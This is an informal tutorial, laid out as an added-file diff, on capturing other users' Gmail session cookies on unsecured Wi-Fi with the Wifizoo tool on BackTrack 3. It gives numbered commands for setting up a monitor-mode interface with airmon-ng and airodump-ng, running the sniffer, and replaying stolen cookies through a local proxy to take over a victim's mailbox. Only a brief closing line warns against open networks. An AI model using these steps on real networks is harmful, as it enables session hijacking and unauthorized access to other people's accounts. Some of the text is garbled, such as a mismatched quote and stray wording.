@@ -1,0 +1,52 @@
+Today i will Teach u how to Sniff Gmail cookies in Unsecured Wireless network using Wifizoo tool in Backtrack 3
+
+1) mkdir /root/Desktop/wifizoo
+2) cd /root/Desktop/wifizoo
+3) wget http://wifizoo.info/wifizoo_black_v1.3.tar.bz2
+4) tar jxvf wifizoo_black_v1.3.tar.bz2
+5) cd /root/Desktop/wifizoo/wifizoo_black_v1.3
+
+Now we'll open the file with kwrite wifizoo.py (python script language) and modify it to match with the interface u use. at the row 50 , it will indicate the interface,
+as my card is RT 73 Chipset i use rausb0
+
+Code:
+
+6) conf.iface = 'rausb0?
+
+then make sure u make ur wifi card in Monitor mode
+
+run this command in another Terminal
+
+7) airmon-ng start rausb0
+
+and then monitor the Access Points
+
+8) airodump-ng rausb0
+
+then come back to 1st terminal
+
+and type this command
+
+9) python wifizoo.py -i rausb0 (your Interface)
+
+It can be seen that interface wifizoo launches web port 8000 on the local server and the proxy is available on port 8080.
+This will be very useful in the future First, let us connect to wifizoo control panel with firefox:
+
+10)firefox 127.0.0.1:8000
+
+And here's administrative interface Wifizoo
+
+We get down to business by clicking on "Cookies":
+
+heyyy Wifizoo has captured cookies, you can see the image on a cookie google mail.
+Before you can use these cookies, you must configure Firefox to connect through proxy turning locally on port 8080. It is in Edit, Preferences, Network, check on Manual proxy configuration and configure the HTTP proxy on port 8080, then
+
+We can now return to the "Cookies" panel Wifizoo hotel. By clicking on the cookie gmail (all information about the cookie, in blue), wifizoo will automatically build on the currently used proxy on port 8080. The indication "Cookie Set!" shows that the cookie has been forged and can be reused>
+
+Then simply click jump to it will take u to Google.com then click mail.
+
+you r done u have Sniffed others cookies.
+
+So never use Unsecure Wireless Networks,
+
+Be secure Stay secure
